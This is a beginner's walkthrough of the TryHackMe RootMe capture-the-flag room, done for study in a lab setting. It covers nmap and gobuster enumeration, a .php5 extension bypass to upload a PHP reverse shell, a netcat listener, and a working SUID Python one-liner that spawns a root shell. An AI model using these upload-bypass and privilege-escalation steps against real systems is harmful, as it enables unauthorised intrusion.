# 🎯 RootMe — Linux Exploitation Case Report

TryHackMe Walkthrough • File Upload Exploit • PHP Reverse Shell • SUID Privilege Escalation

## 📝 Author’s Note

I am still new to privilege escalation and post‑exploitation. Some parts of this challenge required AI assistance, especially when dealing with SUID binaries and Python privilege escalation. This report documents my honest learning process as I develop real hacking skills while moving toward full mastery.

---

## 🧭 Overview

This report documents the complete exploitation of the **RootMe** room on TryHackMe.
The challenge focuses on Linux enumeration, finding an upload point, bypassing file restrictions, getting a reverse shell, and escalating privileges through a misconfigured SUID binary.

### Techniques used:

* Service enumeration (Nmap)
* Directory fuzzing (Gobuster)
* File upload bypass (.php5 trick)
* PHP reverse shell execution
* Netcat listener for shell catch
* SUID privilege escalation using Python

---

## 🏷️ Case Summary

| Field                | Details                         |
| -------------------- | ------------------------------- |
| Room Name            | RootMe                          |
| Target OS            | Linux                           |
| Goal                 | User + Root flags               |
| Initial Access       | File upload → PHP reverse shell |
| Privilege Escalation | SUID Python binary              |

---

## 🐾 Task 1 — Mission Start

Deploy the machine and connect to the TryHackMe VPN.
*No answers required.*

---

## 🐾 Task 2 — Reconnaissance

**🎯 Goal:** Identify exposed services and locate a foothold.

### 🔍 Port Scan (Nmap)

```bash
nmap -A <TARGET-IP>
```

**Result:**
2 open ports.

* **22/tcp — ssh**
* **80/tcp — Apache 2.4.41**

### 🔍 Directory Fuzzing (Gobuster)

```bash
gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/dirb/common.txt
```

**Hidden directory discovered:**

```
/panel/
```

This directory contains a file upload form — the entry point for exploitation.

---

## 🐾 Task 3 — Getting a Shell

**🎯 Goal:** Upload a reverse shell and capture user.txt.

### 🔥 File Upload Bypass

The upload form blocks `.php` files.

By renaming the payload to:

```
shell.php5
```

the server accepts it.

### 🔥 Reverse Shell Payload (Customized)

I generated a PHP reverse shell, changed:

* **LHOST** = Ir IP
* **LPORT** = 4444

### 🔥 Netcat Listener

```bash
nc -lvnp 4444
```

### 🔥 Trigger the Shell

Go to:

```
/uploads/shell.php5
```

Once clicked, Ir reverse shell instantly connected back.

### 📄 User Flag

```
THM{y0u_g0t_a_sh3ll}
```

---

## 🐾 Task 4 — Privilege Escalation

**🎯 Goal:** Get root via SUID permission abuse.

### 🔍 SUID Enumeration

```bash
find / -perm -4000 2>/dev/null
```

**Weird SUID file identified:**

```
/usr/bin/python
```

### 🔥 Exploitation

As a beginner, I used AI assistance to understand Python SUID escalation.

Working exploit:

```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

This immediately spawns a **root shell**.

### 📄 Root Flag

```
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## 🧩 Final Conclusion

The RootMe machine demonstrates classic beginner‑friendly exploitation and privilege escalation techniques:

✔ Apache enumeration
✔ Directory brute‑forcing
✔ File upload bypass using .php5
✔ Reverse shell execution
✔ Privilege escalation via SUID misconfiguration
✔ Lesson learned: SUID binaries can be extremely dangerous when misconfigured

I successfully achieved **full system compromise**, even while still learning exploitation and privilege escalation fundamentals.


